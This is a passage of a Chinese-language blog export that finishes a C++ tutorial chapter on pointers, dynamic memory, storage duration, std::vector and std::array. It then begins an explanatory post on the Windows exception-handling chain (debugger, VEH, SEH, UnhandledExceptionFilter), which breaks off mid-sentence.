typeName[size]; 解引用: 使用 * 访问指针指向的值: value = *pointerName; 或 *pointerName = newValue;。 指针与数组: 数组名通常可视为指向第一个元素的常量指针。指针算术允许在数组元素间移动。array[i] 等价于 *(array + i)。 动态内存: 使用 new 分配，必须使用 delete (对应 new) 或 delete[] (对应 new[]) 释放。 危险: 未初始化指针、空指针解引用、悬挂指针、内存泄漏、错误的 delete/delete[] 使用。 指针本身 vs 指向的值: pointerName 存储的是地址，*pointerName 是该地址处的值。 4.8.3 指针和字符串C 风格字符串本质上是 char 类型的数组，以空字符 \\0 结尾。因此，指针在处理 C 风格字符串时非常常用。 字符串字面值: 字符串字面值（如 &quot;Hello&quot;) 在内存中存储为 const char 数组，并以 \\0 结尾。字符串字面值本身可以被当作指向其第一个字符的 const char* 指针。 char 指针: 可以声明 char* 或 const char* 指针来指向 C 风格字符串。 用法与示例: 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;iostream&gt;#include &lt;cstring&gt; // 为了 strlen()int main() &#123; char animal[20] = &quot;bear&quot;; // animal 是 char 数组 const char *bird = &quot;wren&quot;; // bird 是指向 &quot;wren&quot; 字符串字面值第一个字符 &#x27;w&#x27; 的指针 char *p_animal; // 未初始化的 char 指针 std::cout &lt;&lt; animal &lt;&lt; &quot; and &quot; &lt;&lt; bird &lt;&lt; std::endl; // cout 知道如何处理 char* (打印直到 \\0) // 指针指向数组 p_animal = animal; // p_animal 指向 animal 数组的第一个字符 &#x27;b&#x27; std::cout &lt;&lt; &quot;Pointer p_animal points to: &quot; &lt;&lt; p_animal &lt;&lt; std::endl; // 输出 &quot;bear&quot; // 访问字符串内容 std::cout &lt;&lt; &quot;First char via array: &quot; &lt;&lt; animal[0] &lt;&lt; std::endl; // b std::cout &lt;&lt; &quot;First char via pointer: &quot; &lt;&lt; *p_animal &lt;&lt; std::endl; // b // 指针算术遍历字符串 std::cout &lt;&lt; &quot;Using pointer arithmetic:&quot; &lt;&lt; std::endl; const char *p_bird = bird; while (*p_bird != &#x27;\\0&#x27;) &#123; // 循环直到遇到空字符 std::cout &lt;&lt; *p_bird &lt;&lt; &quot; &quot;; p_bird++; // 指针移动到下一个字符 &#125; std::cout &lt;&lt; std::endl; // 字符串字面值和指针 const char *p_literal = &quot;This is a literal&quot;; std::cout &lt;&lt; p_literal &lt;&lt; std::endl; // p_literal[0] = &#x27;t&#x27;; // 错误! 字符串字面值通常是只读的 (const char*) // 动态分配字符串 char *p_dynamic_str = new char[strlen(&quot;Dynamic String&quot;) + 1]; // +1 为了空字符 strcpy(p_dynamic_str, &quot;Dynamic String&quot;); // 使用 strcpy 复制 (不安全，最好用 strncpy 或 C++ string) std::cout &lt;&lt; &quot;Dynamic string: &quot; &lt;&lt; p_dynamic_str &lt;&lt; std::endl; delete [] p_dynamic_str; // 释放动态分配的数组 p_dynamic_str = nullptr; return 0;&#125; 注意: cout 对 char* 有特殊处理，它会打印从指针指向地址开始直到遇到空字符 \\0 的所有字符。 修改字符串字面值是未定义行为，应使用 const char* 指向它们。 处理 C 风格字符串时要特别注意缓冲区溢出问题（例如使用 strcpy 时目标数组不够大），并确保字符串以 \\0 结尾。std::string 类通常是更安全、更方便的选择。 4.8.4 使用new创建动态结构就像可以动态分配基本类型和数组一样，也可以使用 new 动态创建结构体（或类）对象。 分配: 1StructureName * pointerVariable = new StructureName; 这会在自由存储区分配足够存储 StructureName 结构所有成员的内存，并调用该结构的构造函数（如果是类或有构造函数的结构），然后返回指向新创建结构的指针。 访问成员: 当通过指针访问结构或类的成员时，不能直接使用点运算符 .。有两种方式： 解引用再用点 ((*ptr).member): 先解引用指针 *ptr 得到结构本身，然后使用点运算符访问成员。括号是必需的，因为点运算符的优先级高于解引用运算符。 箭头运算符 (ptr-&gt;member): 这是更常用、更简洁的方式。箭头运算符 -&gt; 专门用于通过指针访问其指向的结构或类的成员。ptr-&gt;member 完全等价于 (*ptr).member。 释放: 使用 delete 释放由 new 创建的单个结构对象。delete 会先调用该对象的析构函数（如果需要），然后释放内存。 12delete pointerVariable;pointerVariable = nullptr; // 好习惯 用法与示例: 1234567891011121314151617181920212223242526272829303132333435#include &lt;iostream&gt;#include &lt;string&gt;struct Inflatable &#123; std::string name; float volume; double price;&#125;;int main() &#123; // 动态创建 Inflatable 结构 Inflatable *ps = new Inflatable; // 在自由存储区创建结构 // 访问成员 // 方法 1: 解引用和点运算符 (*ps).name = &quot;Dynamic Floatie&quot;; (*ps).volume = 1.5f; // 方法 2: 箭头运算符 (更常用) ps-&gt;price = 29.99; std::cout &lt;&lt; &quot;Dynamically created structure:&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot; Name: &quot; &lt;&lt; ps-&gt;name &lt;&lt; std::endl; std::cout &lt;&lt; &quot; Volume: &quot; &lt;&lt; (*ps).volume &lt;&lt; std::endl; // 两种方式都可以用 std::cout &lt;&lt; &quot; Price: &quot; &lt;&lt; ps-&gt;price &lt;&lt; std::endl; std::cout &lt;&lt; &quot; Address: &quot; &lt;&lt; ps &lt;&lt; std::endl; // 释放动态创建的结构 delete ps; ps = nullptr; std::cout &lt;&lt; &quot;Structure deleted.&quot; &lt;&lt; std::endl; return 0;&#125; 4.8.5 自动存储、静态存储和动态存储C++ 程序中的变量和数据根据其内存分配方式和生命周期，可以分为三种主要的存储类别： 自动存储持续性 (Automatic Storage Duration): 内存区域: 通常在称为栈 (Stack) 的内存区域分配。 分配/释放: 内存的分配和释放在函数（或代码块）进入和退出时自动进行。 生命周期: 变量在声明它的函数或代码块执行期间存在，块结束时自动销毁。 例子: 函数内部声明的非 static 局部变量（包括函数参数）。 特点: 分配和释放速度快，管理简单（自动），但空间有限，生命周期受限于作用域。 静态存储持续性 (Static Storage Duration): 内存区域: 在程序的整个生命周期内都存在于内存的某个固定区域（通常是静态/全局数据区）。 分配/释放: 内存在程序启动时分配（或首次使用时，对于某些静态变量），在程序结束时释放。 生命周期: 从程序开始执行到程序结束。 例子: 在函数外部声明的变量（全局变量）、使用 static 关键字在函数内部或类内部声明的变量。 特点: 生命周期长，可以跨函数调用保持其值，但全局变量可能导致命名冲突和管理复杂性。 动态存储持续性 (Dynamic Storage Duration): 内存区域: 在称为自由存储区 (Free Store) 或 堆 (Heap) 的内存区域分配。 分配/释放: 内存由程序员使用 new (或 malloc 等 C 函数) 显式分配，并且必须使用 delete (或 free) 显式释放。 生命周期: 从 new 分配成功开始，直到程序员使用 delete 释放为止。生命周期与函数或代码块的作用域无关。 例子: 使用 new 创建的变量、数组或对象。 特点: 提供了最大的灵活性，可以在运行时根据需要分配任意大小的内存，生命周期由程序员控制。但管理复杂，容易出现内存泄漏（忘记 delete）或悬挂指针（delete 后仍使用指针）等问题。 示例对比: 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;int global_static_var = 10; // 静态存储 (全局)static int file_static_var = 20; // 静态存储 (文件作用域)void func() &#123; int auto_var = 30; // 自动存储 (栈) static int func_static_var = 40; // 静态存储 (函数作用域，只初始化一次) int *dynamic_var = new int(50); // 动态存储 (堆) std::cout &lt;&lt; &quot; Inside func:&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot; auto_var address: &quot; &lt;&lt; &amp;auto_var &lt;&lt; &quot; value: &quot; &lt;&lt; auto_var &lt;&lt; std::endl; std::cout &lt;&lt; &quot; func_static_var address: &quot; &lt;&lt; &amp;func_static_var &lt;&lt; &quot; value: &quot; &lt;&lt; ++func_static_var &lt;&lt; std::endl; std::cout &lt;&lt; &quot; dynamic_var address: &quot; &lt;&lt; dynamic_var &lt;&lt; &quot; value: &quot; &lt;&lt; *dynamic_var &lt;&lt; std::endl; delete dynamic_var; // 必须手动释放动态内存 dynamic_var = nullptr;&#125; // auto_var 在这里销毁int main() &#123; std::cout &lt;&lt; &quot;Global static var address: &quot; &lt;&lt; &amp;global_static_var &lt;&lt; &quot; value: &quot; &lt;&lt; global_static_var &lt;&lt; std::endl; std::cout &lt;&lt; &quot;File static var address: &quot; &lt;&lt; &amp;file_static_var &lt;&lt; &quot; value: &quot; &lt;&lt; file_static_var &lt;&lt; std::endl; std::cout &lt;&lt; &quot;\\nCalling func first time:&quot; &lt;&lt; std::endl; func(); std::cout &lt;&lt; &quot;\\nCalling func second time:&quot; &lt;&lt; std::endl; func(); // 注意 func_static_var 的值会保持 // int* dangling_ptr; // &#123; // int temp_auto = 100; // 自动存储 // dangling_ptr = &amp;temp_auto; // &#125; // temp_auto 销毁 // std::cout &lt;&lt; *dangling_ptr; // 错误! 悬挂指针 return 0;&#125; 理解这三种存储方式对于编写健壮、高效且无内存错误的 C++ 程序至关重要。现代 C++ 倾向于使用 RAII (Resource Acquisition Is Initialization) 技术和智能指针（如 std::unique_ptr, std::shared_ptr）来自动管理动态内存，以减少手动 new/delete 带来的风险。 4.9 类型组合C++ 的强大之处在于其类型系统允许你将基本类型、复合类型（数组、结构、共用体、枚举）和指针以多种方式组合起来，创建更复杂的数据结构来精确地模拟现实世界的问题。 本章我们已经接触了一些组合： 结构数组 (Array of Structures): 数组的每个元素都是一个结构体 (见 4.4.5)。 结构包含 std::string 成员: 结构体可以包含类类型的成员 (见 4.4.3)。 指针指向结构: 可以声明指向结构体对象的指针 (见 4.8.4)。 指针指向数组 (或数组名视为指针): 指针可以用来操作数组 (见 4.8.1)。 本节将进一步探讨一些常见的类型组合方式。 1. 结构包含数组成员: 结构体可以包含数组作为其成员。 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;string&gt;struct StudentGrades &#123; std::string studentName; int grades[5]; // 包含一个 int 数组作为成员 int numGrades; // 记录实际存储的成绩数量&#125;;int main() &#123; StudentGrades alice; alice.studentName = &quot;Alice&quot;; alice.grades[0] = 95; alice.grades[1] = 88; alice.grades[2] = 92; alice.numGrades = 3; std::cout &lt;&lt; alice.studentName &lt;&lt; &quot;&#x27;s first grade: &quot; &lt;&lt; alice.grades[0] &lt;&lt; std::endl; double sum = 0; for (int i = 0; i &lt; alice.numGrades; ++i) &#123; sum += alice.grades[i]; &#125; if (alice.numGrades &gt; 0) &#123; std::cout &lt;&lt; &quot;Average grade: &quot; &lt;&lt; sum / alice.numGrades &lt;&lt; std::endl; &#125; return 0;&#125; 2. 结构包含指针成员: 结构体可以包含指针作为成员。这常用于指向动态分配的内存或指向其他数据结构。 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;string&gt;struct DynamicData &#123; std::string label; int* data_ptr; // 指向动态分配的 int 数组 int size;&#125;;int main() &#123; DynamicData myData; myData.label = &quot;Sensor Readings&quot;; myData.size = 10; myData.data_ptr = new int[myData.size]; // 动态分配内存 // 初始化动态数据 for (int i = 0; i &lt; myData.size; ++i) &#123; myData.data_ptr[i] = i * i; &#125; std::cout &lt;&lt; &quot;Label: &quot; &lt;&lt; myData.label &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Data at index 3: &quot; &lt;&lt; myData.data_ptr[3] &lt;&lt; std::endl; // 输出 9 // **重要:** 必须手动释放指针成员指向的动态内存 delete [] myData.data_ptr; myData.data_ptr = nullptr; // 避免悬挂指针 return 0;&#125; 注意: 当结构包含指针成员指向动态内存时，需要特别注意内存管理（复制、赋值、析构），这通常涉及到类的特殊成员函数（拷贝构造函数、拷贝赋值运算符、析构函数），我们将在后续章节深入学习。 3. 指针数组 (Array of Pointers): 可以创建数组，其每个元素都是一个指针。 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;int main() &#123; int a = 10, b = 20, c = 30; int* ptr_array[3]; // 声明一个包含 3 个 int* 指针的数组 ptr_array[0] = &amp;a; // 第一个元素指向 a ptr_array[1] = &amp;b; // 第二个元素指向 b ptr_array[2] = &amp;c; // 第三个元素指向 c std::cout &lt;&lt; &quot;Values via pointer array:&quot; &lt;&lt; std::endl; for (int i = 0; i &lt; 3; ++i) &#123; std::cout &lt;&lt; &quot; Value at *ptr_array[&quot; &lt;&lt; i &lt;&lt; &quot;]: &quot; &lt;&lt; *ptr_array[i] &lt;&lt; std::endl; &#125; // 也可以指向动态分配的内存 int* dyn_ptr_array[2]; dyn_ptr_array[0] = new int(100); dyn_ptr_array[1] = new int(200); std::cout &lt;&lt; &quot;\\nDynamic values:&quot; &lt;&lt; std::endl; std::cout &lt;&lt; *dyn_ptr_array[0] &lt;&lt; std::endl; std::cout &lt;&lt; *dyn_ptr_array[1] &lt;&lt; std::endl; // 释放动态内存 delete dyn_ptr_array[0]; delete dyn_ptr_array[1]; dyn_ptr_array[0] = nullptr; dyn_ptr_array[1] = nullptr; return 0;&#125; 指针数组常用于存储 C 风格字符串数组（const char*[]）或管理一组动态分配的对象。 4. 指向指针的指针 (Pointer to Pointer): 指针本身也是变量，它也有自己的内存地址。因此，可以声明一个指向指针的指针。 123456789101112131415161718192021222324#include &lt;iostream&gt;int main() &#123; int value = 42; int *ptr = &amp;value; // ptr 指向 value (int*) int **pptr = &amp;ptr; // pptr 指向 ptr (int**) std::cout &lt;&lt; &quot;Value: &quot; &lt;&lt; value &lt;&lt; std::endl; // 42 std::cout &lt;&lt; &quot;Address of value (&amp;value): &quot; &lt;&lt; &amp;value &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Value of ptr (address of value): &quot; &lt;&lt; ptr &lt;&lt; std::endl; // value 的地址 std::cout &lt;&lt; &quot;Value via ptr (*ptr): &quot; &lt;&lt; *ptr &lt;&lt; std::endl; // 42 std::cout &lt;&lt; &quot;Address of ptr (&amp;ptr): &quot; &lt;&lt; &amp;ptr &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Value of pptr (address of ptr): &quot; &lt;&lt; pptr &lt;&lt; std::endl; // ptr 的地址 std::cout &lt;&lt; &quot;Value via pptr (*pptr): &quot; &lt;&lt; *pptr &lt;&lt; std::endl; // ptr 的值 (即 value 的地址) std::cout &lt;&lt; &quot;Value via pptr (**pptr): &quot; &lt;&lt; **pptr &lt;&lt; std::endl; // value 的值 (42) // 修改值 **pptr = 50; std::cout &lt;&lt; &quot;New value: &quot; &lt;&lt; value &lt;&lt; std::endl; // 输出 50 return 0;&#125; 指向指针的指针常用于： 在函数中修改调用者传入的指针本身（使其指向不同的地址）。 处理动态分配的指针数组（例如 char** argv in main）。 总结: 通过组合基本类型、数组、结构、指针等，可以构建出非常灵活和强大的数据结构。理解每种组合方式的内存布局、访问方式以及（特别是涉及指针和动态内存时）生命周期管理规则是编写复杂 C++程序的关键。随着学习的深入，我们将看到更多高级的组合和抽象方式，例如使用类和标准库容器。 4.10 数组的替代品虽然 C++ 内置的数组（包括动态分配的数组）功能强大，但它们存在一些固有的缺点：数组大小通常需要在编译时确定（对于栈上的数组），或者需要手动进行动态内存管理（对于堆上的数组），并且不提供边界检查等安全特性。 C++ 标准模板库 (STL) 提供了更安全、更灵活的数组替代品：vector 和 array。 4.10.1 模板类vectorstd::vector 是 STL 提供的一个动态数组模板类。它封装了动态大小的数组，可以根据需要自动增长或缩小，并负责管理其元素的内存。 特点: 动态大小: 可以在运行时添加或删除元素，vector 会自动处理内存的重新分配。 内存管理: 自动管理元素存储的内存（通常在自由存储区/堆上分配）。 随机访问: 像普通数组一样，可以通过索引 [] 快速访问任何元素。 边界检查 (可选): 提供 at() 成员函数进行带边界检查的元素访问。 丰富的成员函数: 提供 push_back(), pop_back(), size(), empty(), clear(), insert(), erase() 等多种方便的操作。 模板类: vector 是一个模板，需要指定存储的元素类型，例如 std::vector&lt;int&gt;, std::vector&lt;double&gt;, std::vector&lt;std::string&gt;。 使用方法: 包含头文件: #include &lt;vector&gt; 声明和初始化: 1234567891011#include &lt;vector&gt;#include &lt;string&gt;// 声明std::vector&lt;int&gt; scores; // 创建一个空的 int vectorstd::vector&lt;double&gt; lengths(10); // 创建包含 10 个 double 元素的 vector (默认初始化为 0.0)std::vector&lt;std::string&gt; names(5, &quot;Unknown&quot;); // 创建包含 5 个 string 元素，都初始化为 &quot;Unknown&quot;// C++11 列表初始化std::vector&lt;int&gt; primes &#123;2, 3, 5, 7, 11&#125;; // 创建并初始化std::vector&lt;char&gt; vowels &#123;&#x27;a&#x27;, &#x27;e&#x27;, &#x27;i&#x27;, &#x27;o&#x27;, &#x27;u&#x27;&#125;; 访问元素: [] 运算符: scores[0], names[i] (不进行边界检查)。 at() 函数: scores.at(0), names.at(i) (进行边界检查，越界抛出 std::out_of_range 异常)。 常用操作: push_back(value): 在 vector 末尾添加一个元素。 size(): 返回 vector 中元素的数量。 empty(): 检查 vector 是否为空。 clear(): 移除所有元素。 pop_back(): 移除末尾的元素。 用法与示例: 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;string&gt;int main() &#123; // 创建和初始化 std::vector&lt;int&gt; numbers; // 空 vector std::vector&lt;std::string&gt; tasks &#123;&quot;Read&quot;, &quot;Write&quot;, &quot;Code&quot;&#125;; // 添加元素 numbers.push_back(10); // numbers: &#123;10&#125; numbers.push_back(20); // numbers: &#123;10, 20&#125; numbers.push_back(30); // numbers: &#123;10, 20, 30&#125; // 访问元素 std::cout &lt;&lt; &quot;First number: &quot; &lt;&lt; numbers[0] &lt;&lt; std::endl; // 输出 10 std::cout &lt;&lt; &quot;Second task: &quot; &lt;&lt; tasks.at(1) &lt;&lt; std::endl; // 输出 Write // std::cout &lt;&lt; tasks.at(3); // 会抛出异常 // 修改元素 numbers[0] = 15; // 获取大小 std::cout &lt;&lt; &quot;Number of tasks: &quot; &lt;&lt; tasks.size() &lt;&lt; std::endl; // 输出 3 // 遍历 vector (C++11 基于范围的 for 循环) std::cout &lt;&lt; &quot;Numbers:&quot;; for (int num : numbers) &#123; std::cout &lt;&lt; &quot; &quot; &lt;&lt; num; &#125; std::cout &lt;&lt; std::endl; // 输出 Numbers: 15 20 30 // 遍历 vector (传统 for 循环) std::cout &lt;&lt; &quot;Tasks:&quot;; for (size_t i = 0; i &lt; tasks.size(); ++i) &#123; // 使用 size_t 作为索引类型 std::cout &lt;&lt; &quot; &quot; &lt;&lt; tasks[i]; &#125; std::cout &lt;&lt; std::endl; // 输出 Tasks: Read Write Code // 移除末尾元素 numbers.pop_back(); // numbers: &#123;15, 20&#125; std::cout &lt;&lt; &quot;Last number after pop: &quot; &lt;&lt; numbers.back() &lt;&lt; std::endl; // back() 访问最后一个元素 return 0;&#125; std::vector 是 C++ 中替代动态数组的首选方案，因为它更安全、更易于管理。 4.10.2 模板类array（C++11）C++11 引入了 std::array 模板类，它封装了固定大小的数组。与 C 风格数组类似，其大小在编译时确定，但它提供了更现代的接口和一些 vector 具有的便利性（如 size(), at()）。 特点: 固定大小: 数组大小必须在编译时指定为模板参数，之后不能改变。 内存位置: 通常在栈上分配内存（如果作为局部变量声明），与 C 风格数组类似，除非显式使用 new 创建。 类型安全: 大小是类型的一部分 (std::array&lt;int, 5&gt; 和 std::array&lt;int, 10&gt; 是不同的类型)。 STL 接口: 提供与 vector 类似的接口，如 size(), empty(), at(), [], front(), back()，以及迭代器支持，可以方便地与 STL 算法一起使用。 无开销抽象: 通常不会比 C 风格数组带来额外的运行时性能开销。 模板类: 需要指定元素类型和大小，例如 std::array&lt;int, 10&gt;, std::array&lt;double, 3&gt;。 使用方法: 包含头文件: #include &lt;array&gt; 声明和初始化: 123456789101112131415#include &lt;array&gt;#include &lt;string&gt;// 声明std::array&lt;int, 5&gt; scores; // 创建包含 5 个 int 的 array (元素值未定义，除非是静态存储)std::array&lt;double, 3&gt; coords &#123;&#125;; // 创建包含 3 个 double 的 array, 零初始化 &#123;0.0, 0.0, 0.0&#125;// C++11 列表初始化std::array&lt;int, 4&gt; values &#123;1, 2, 3, 4&#125;; // 创建并初始化std::array&lt;std::string, 2&gt; names &#123;&quot;Alice&quot;, &quot;Bob&quot;&#125;;// 注意: 初始化列表的元素数量不能超过 array 的大小// std::array&lt;int, 3&gt; errors &#123;1, 2, 3, 4&#125;; // 错误!// 如果元素数量少于 array 大小，剩余元素会被值初始化 (通常为 0)std::array&lt;int, 5&gt; partial &#123;10, 20&#125;; // &#123;10, 20, 0, 0, 0&#125; 访问元素: [] 运算符: scores[0], names[i] (不进行边界检查)。 at() 函数: scores.at(0), names.at(i) (进行边界检查，越界抛出 std::out_of_range 异常)。 常用操作: size(): 返回数组的大小（编译时常量）。 empty(): 检查数组是否为空（对于大小 &gt; 0 的 std::array 总是返回 false）。 fill(value): 将所有元素设置为指定值。 front(): 访问第一个元素。 back(): 访问最后一个元素。 用法与示例: 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;array&gt;#include &lt;string&gt;#include &lt;numeric&gt; // 为了 std::accumulateint main() &#123; // 创建和初始化 std::array&lt;int, 5&gt; data &#123;10, 20, 30, 40, 50&#125;; std::array&lt;std::string, 3&gt; colors &#123;&quot;Red&quot;, &quot;Green&quot;, &quot;Blue&quot;&#125;; std::array&lt;double, 4&gt; temps &#123;&#125;; // &#123;0.0, 0.0, 0.0, 0.0&#125; // 访问元素 std::cout &lt;&lt; &quot;First data element: &quot; &lt;&lt; data[0] &lt;&lt; std::endl; // 输出 10 std::cout &lt;&lt; &quot;Second color: &quot; &lt;&lt; colors.at(1) &lt;&lt; std::endl; // 输出 Green std::cout &lt;&lt; &quot;A temperature: &quot; &lt;&lt; temps[2] &lt;&lt; std::endl; // 输出 0 // 获取大小 std::cout &lt;&lt; &quot;Size of data array: &quot; &lt;&lt; data.size() &lt;&lt; std::endl; // 输出 5 // 填充 temps.fill(25.5); std::cout &lt;&lt; &quot;Filled temperature: &quot; &lt;&lt; temps[0] &lt;&lt; std::endl; // 输出 25.5 // 遍历 (C++11 基于范围的 for 循环) std::cout &lt;&lt; &quot;Colors:&quot;; for (const auto&amp; color : colors) &#123; // 使用 const 引用避免复制 std::cout &lt;&lt; &quot; &quot; &lt;&lt; color; &#125; std::cout &lt;&lt; std::endl; // 输出 Colors: Red Green Blue // 与 STL 算法一起使用 double sum = std::accumulate(temps.begin(), temps.end(), 0.0); // 计算总和 std::cout &lt;&lt; &quot;Sum of temperatures: &quot; &lt;&lt; sum &lt;&lt; std::endl; return 0;&#125; std::array 是替代需要固定大小数组的 C 风格数组的现代 C++ 方案。 4.10.3 比较数组、vector对象和array对象 特性 C 风格数组 (T[]) std::vector&lt;T&gt; std::array&lt;T, N&gt; (C++11) 大小 固定 (编译时确定栈数组，运行时确定堆数组) 动态 (可运行时改变) 固定 (编译时确定) 内存分配 栈 (局部) 或 静态区 或 堆 (new[]) 通常在堆上 (自由存储区) 通常在栈上 (除非用 new 创建) 大小信息 无内置方法获取大小 (需单独传递) size() 成员函数 size() 成员函数 (编译时常量) 边界检查 无 (不安全) at() 提供检查, [] 不提供 at() 提供检查, [] 不提供 赋值/复制 不能直接赋值/复制整个数组 可以直接赋值/复制 (深拷贝) 可以直接赋值/复制 (成员逐一复制) 作为函数参数 通常退化为指针 (丢失大小信息) 可以按值、引用或指针传递 可以按值、引用或指针传递 STL 兼容性 有限 (需要指针和大小) 完全兼容 (提供迭代器等) 完全兼容 (提供迭代器等) 性能 通常最快 (直接内存访问) 访问速度快，添加/删除可能涉及内存重分配 通常与 C 风格数组性能相同 头文件 无需 &lt;vector&gt; &lt;array&gt; 选择建议: 需要动态大小: 如果数组大小在运行时才能确定，或者需要在程序运行期间改变大小，**std::vector 是最佳选择**。 需要固定大小 (编译时已知): 如果数组大小在编译时就确定且不会改变： **优先选择 std::array (C++11 及以后)**。它提供了与 C 风格数组相同的性能和内存布局（通常在栈上），但具有更安全、更方便的接口（如 size(), at(), 迭代器）。 如果不能使用 C++11 或有特定 C 接口兼容性需求，可以使用 C 风格数组，但要特别注意安全性和大小管理。 性能关键且大小固定: std::array 和 C 风格数组通常性能最佳。 总的来说，在现代 C++ 中，应优先使用 std::vector 和 std::array 而不是 C 风格数组，以获得更好的类型安全、内存管理和易用性。 4.11 总结本章介绍了C++的**复合类型 (Compound Types)**，它们允许我们将多个值组合成一个数据单元。 我们首先学习了**数组 (Array)**，它用于存储一系列相同类型的数据。我们了解了如何声明数组、使用索引访问元素（从0开始），以及初始化数组的各种规则，包括C++11引入的更安全的列表初始化方法。我们强调了数组大小必须是常量表达式，并且访问数组时需要注意边界，避免越界访问。 接着，我们探讨了处理文本数据的两种方式。第一种是传统的C风格字符串，即以空字符 \\0 结尾的 char 数组。我们学习了如何拼接字符串常量、在数组中使用字符串、以及使用 cin 和 getline 读取字符串输入，并特别注意了混合输入数字和整行字符串时可能遇到的问题。 第二种，也是C++中更推荐的方式，是使用标准库提供的 string 类。string 类提供了自动内存管理、方便的赋值、拼接 (+) 和附加 (+=) 操作，以及大量用于查找、修改、比较和访问字符的成员函数。我们还学习了如何使用 cin, cout, 和 getline 对 string 对象进行输入输出，并了解了C++11引入的原始字符串字面值和Unicode字符串字面值。 结构 (Structure) 被引入作为一种创建自定义复合类型的方式，允许将不同类型的数据项（成员）组合在一起。我们学习了如何定义结构、声明结构变量、使用点运算符 (.) 访问成员，以及C++11的列表初始化。我们还看到结构体可以包含 string 对象或数组作为成员，结构变量可以相互赋值，可以作为函数参数（按值、按引用、按指针）和返回值。结构数组允许我们管理一组结构对象，而位字段则提供了一种在结构内精确控制成员占用位数的方式。 共用体 (Union) 作为另一种复合类型被介绍，其特点是所有成员共享同一块内存空间，主要用于节省内存或进行类型双关（需谨慎）。我们了解了如何定义和访问共用体，以及使用匿名共用体。 枚举 (Enum) 提供了一种创建具名整数常量的方式，提高了代码的可读性和类型安全。我们学习了如何定义枚举、显式设置枚举量的值、枚举的取值范围，并简要介绍了C++11引入的更安全的**作用域内枚举 (enum class)**。 本章的一个核心内容是指针 (Pointer) 和**自由存储空间 (Free Store / Heap)**。指针是存储内存地址的变量。我们学习了如何声明和初始化指针（包括使用 &amp; 获取地址和初始化为 nullptr），如何使用解引用运算符 * 访问指针指向的值，并强调了使用未初始化指针、空指针或悬挂指针的危险。 我们学习了使用 new 运算符在自由存储区动态分配内存（用于单个变量或对象），以及使用 delete 运算符释放这些内存。同样，我们学习了使用 new[] 动态分配数组，并强调必须使用 delete[] 来释放动态数组内存。正确配对 new/delete 和 new[]/delete[] 对于避免内存泄漏和程序崩溃至关重要。 指针与数组的紧密关系以及指针算术也被详细讨论。数组名通常可视为指向第一个元素的指针，指针算术允许在数组元素间移动。我们还看到了如何使用指针处理C风格字符串，以及如何动态创建结构并使用箭头运算符 (-&gt;) 通过指针访问其成员。最后，我们区分了三种主要的存储持续性：自动存储（栈）、静态存储和动态存储（堆）。 我们还探讨了如何组合这些类型，例如创建包含数组或指针成员的结构、指针数组以及指向指针的指针，以构建更复杂的数据表示。 最后，我们介绍了C++标准库提供的内置数组的现代替代品：**std::vector**（动态大小数组）和 **std::array**（固定大小数组，C++11）。它们提供了更安全、更方便的接口和自动内存管理（对于 vector），是现代C++编程中推荐的选择。 通过本章的学习，我们掌握了创建和使用各种复合数据类型以及进行动态内存管理的基本技能。","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Windows异常处理机制深度解析","slug":"windows_exception","date":"2025-03-31T15:49:59.201Z","updated":"2025-03-31T16:19:42.614Z","comments":true,"path":"2025/03/31/windows_exception/","link":"","permalink":"http://uniqueland.top/2025/03/31/windows_exception/","excerpt":"","text":"什么是Windows异常Windows异常是指在程序执行过程中遇到的非正常情况，这些情况会中断程序正常的执行流程。Windows操作系统提供了完善的异常处理机制来应对这些情况，使程序能够优雅地处理错误并尽可能恢复正常运行。 从本质上看，Windows异常可分为两大类：硬件异常和软件异常。硬件异常由CPU直接产生，如内存访问违规、除零错误等；而软件异常则是由程序代码主动触发，如C++的throw语句、Windows API中的RaiseException函数等。 常见的异常触发情况及现象在日常编程和系统使用中，异常可能由多种情况触发。内存访问违规是一种常见情况，包括访问空指针（0x00000000）、访问已释放的内存或尝试写入只读内存区域。计算异常也时有发生，如除零操作、整数溢出或浮点运算错误。非法指令异常则可能源于执行无效或特权指令，或是错误地执行数据区域的内容。此外，还有程序通过RaiseException API、C++的throw语句或.NET中的throw指令主动抛出的异常。 这些异常触发时，用户可能会看到不同的现象：应用程序崩溃并显示”XXX已停止工作”的对话框；Windows错误报告工具弹出；程序无预警地终止运行；在调试环境中触发断点；甚至在严重的内核模式异常情况下导致系统蓝屏。这些现象都是Windows异常处理机制工作的外在表现。 Windows异常处理流程当异常发生时，Windows会按照一个严格的顺序尝试处理异常。首先是异常的触发，CPU检测到异常条件并生成中断。如果程序在调试器下运行，调试器拥有第一优先权来处理这个异常，这使开发人员能够在异常发生的第一时间分析问题。 若无调试器或调试器选择不处理，系统会调用已注册的向量化异常处理函数（Vectored Exception Handlers，VEH）。接下来，如果异常仍未被处理，系统会遍历当前线程的结构化异常处理（Structured Exception Handling，SEH）链，查找能够处理该异常的处理器。 当SEH链中没有合适的处理器时，系统会调用顶层异常过滤器（UnhandledExceptionFilter函数）作为最后的应用程序级防线。如果所有这些机制都无法处理异常，系统将接管并执行默认处理：显示错误对话框并终止进程。这种层层递进的设计确保了异常能够在最适当的层次被处理，同时提供了多重保障机制。 即：异常触发 -- 调试器（若存在） -- 已注册的VEH处理函数（影响整个进程） -- 遍历线程的SEH链（影响单个线程） -- 顶层异常过滤器（兜底） -- 系统默认处理 异常处理各环节的作用及区别调试器处理是异常处理流程的第一关卡。调试器拥有处理异常的最高优先级，可以在异常发生的第一时间捕获并暂停程序执行。这一环节的独特之处在于它能够展示异常发生时的完整上下文，允许开发者修改程序状态后继续执行。异常在调试器中分为一次机会和二次机会异常，为调试提供了灵活性。 向量化异常处理（VEH）提供了一种全局性的异常处理机制，其最大特点是不受函数调用堆栈的限制。开发者可以通过AddVectoredExceptionHandler 